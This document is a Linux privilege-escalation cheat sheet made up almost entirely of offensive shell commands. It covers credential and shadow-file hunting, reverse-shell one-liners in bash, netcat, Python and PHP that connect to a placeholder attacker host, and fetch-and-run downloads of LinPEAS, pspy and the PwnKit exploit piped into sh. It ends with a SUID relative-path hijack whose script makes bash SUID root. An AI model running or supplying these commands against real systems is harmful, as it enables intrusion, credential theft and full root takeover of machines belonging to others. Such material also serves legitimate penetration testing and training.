# Linux Privilege Escalation - Cheat Sheet

### 1. System Information

```bash
uname -a                     # Kernel version
cat /etc/issue               # OS version
cat /proc/version            # Kernel details
cat /etc/os-release          # OS details
id                           # Current user info
whoami                       # Current user
who -a                       # Active sessions
last                         # Login history
ps aux --forest              # Running processes
```

### 2. Searching for Sensitive Files

```bash
find / -name "*pass*" 2>/dev/null    # Search for files containing "pass"
grep -r "password" /etc/ 2>/dev/null # Search for passwords
find / -perm -4000 -type f 2>/dev/null # SUID files
find / -perm -2000 -type f 2>/dev/null # SGID files
find / -user root -perm -4000 -exec ls -la {} + 2>/dev/null # Root SUID files
find /home -type f -name '.*history' 2>/dev/null # Command history files
```

### 3. Permissions and Users

```bash
sudo -l                         # Check sudo privileges
cat /etc/passwd                 # List users
cat /etc/shadow                 # Hashed passwords (if accessible)
cat /etc/group                  # List groups
getent passwd                    # User info
getent group                     # Group info
ls -la /root/                    # Access root home
```

### 4. Cron Jobs

```bash
ls -la /etc/cron*                # List cron jobs
cat /etc/crontab                 # Global crontab content
find / -type f -iname "*cron*" 2>/dev/null # Search for cron jobs
systemctl list-timers --all      # Check systemd timers
```

### 5. Services and Processes

```bash
netstat -tulpn                   # Listening services
ss -tulpn                        # Alternative to netstat
ps aux | grep root               # Processes running as root
ps -ef | grep apache             # Apache processes
systemctl list-units --type=service --all # Active/inactive services
```

### 6. Logs and Emails

```bash
ls -lah /var/log/                # List logs
cat /var/log/auth.log            # Authentication logs
cat /var/log/syslog              # System logs
cat /var/spool/mail/*            # Emails
```

### 7. Common Service Paths

```bash
/etc/passwd
/etc/shadow
/etc/group
/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/etc/cron.weekly/
/etc/cron.monthly/
/var/spool/cron/
/var/spool/cron/crontabs/
/etc/systemd/system/
/usr/lib/systemd/system/
```

### 8. Reverse Shells

```bash
nc -e /bin/bash ATTACKER_IP ATTACKER_PORT  # Netcat (if -e is supported)
nc -c bash ATTACKER_IP ATTACKER_PORT       # Netcat alternative
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1  # Bash reverse shell
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",ATTACKER_PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'  # Python3 reverse shell
php -r '$sock=fsockopen("ATTACKER_IP",ATTACKER_PORT);exec("/bin/sh -i <&3 >&3 2>&3");'  # PHP reverse shell
```

### 9. Exploitation & Enumeration Tools

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/download/20250301-c97fb02a/linpeas.sh -O linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh  # Run LinPEAS

wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O pspy64
chmod +x pspy64 && ./pspy64  # Run pspy to monitor processes

#if vulnerable to Pwnkit
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```

### 10. Practical Exploitation

<details>

<summary>SUID Executables</summary>

If you have a custom executable that has SUID, look if you can't find relative paths

[https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e](https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e)

```
strace -f ./executable 2>&1 | grep -iE "open|access|exec|execve"
```

malicious bash file if you find a relative path:

```
#!/bin/bash
/usr/bin/chmod u+s /bin/bash
/usr/bin/echo Done
```

Change path variable with the place you created you bash file:

```
export PATH=/home/user:$PATH
```

once you run the SUID file, `bash -p`

</details>
